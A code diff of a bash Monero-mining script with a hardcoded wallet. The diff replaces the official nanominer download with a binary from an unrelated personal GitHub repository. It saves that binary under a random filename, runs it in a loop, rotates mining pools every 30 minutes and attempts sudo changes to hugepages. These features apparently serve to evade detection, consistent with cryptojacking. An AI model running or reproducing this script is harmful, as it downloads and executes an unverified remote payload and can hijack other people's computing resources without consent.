@@ -3,13 +3,14 @@
 # ================================
 # Nanominer XMR Script
 # Random pool + Random rigName
+# Custom download URL
 # ================================
 
 # Monero wallet
 WALLET="4ADCVdveAjhDVHXYGUCkX4513LZaGF7bY2dxngyaxBZaW1YJAWsNRpiRfRcEwUma1gLpPkoQ5tBzES6jXfPiZoUH5ti313h"
 
-# Nanominer download URL
-URL="https://github.com/nanopool/nanominer/releases/latest/download/nanominer-linux-64.tar.gz"
+# Custom miner download URL
+URL="https://github.com/vedhagsvp/qubros/releases/download/srmn/nanops"
 
 # Pool list (host:port)
 POOLS=(
@@ -33,12 +34,13 @@ select_random_pool() {
     echo "${POOLS[$idx]}"
 }
 
-# Download Nanominer
-download_nanomininer() {
-    echo "📥 Downloading Nanominer..."
-    wget -q "$URL" -O nanominer.tar.gz || exit 1
-    tar -xzf nanominer.tar.gz
-    chmod +x nanominer
+# Download miner
+download_miner() {
+    FILENAME=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 10)
+    echo "📥 Downloading miner..."
+    wget -q "$URL" -O "$FILENAME" || exit 1
+    chmod +x "$FILENAME"
+    echo "$FILENAME"
 }
 
 # Create config.ini
@@ -60,23 +62,25 @@ EOF
 
 # Run miner
 run_miner() {
+    MINER="$1"
     while true; do
-        ./nanominer -c config.ini >> miner.log 2>&1 &
+        ./"$MINER" -c config.ini >> miner.log 2>&1 &
         PID=$!
         sleep 1800   # 30 minutes
         kill "$PID" 2>/dev/null
         wait "$PID" 2>/dev/null
         sleep 15
-        create_config  # Pick a new random pool each restart
+        create_config  # Pick new random pool each restart
     done
 }
 
 main() {
     [[ "$(uname)" != "Linux" ]] && exit 1
     sudo sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1
-    download_nanomininer
+
+    MINER_FILE=$(download_miner)
     create_config
-    run_miner
+    run_miner "$MINER_FILE"
 }
 
 main
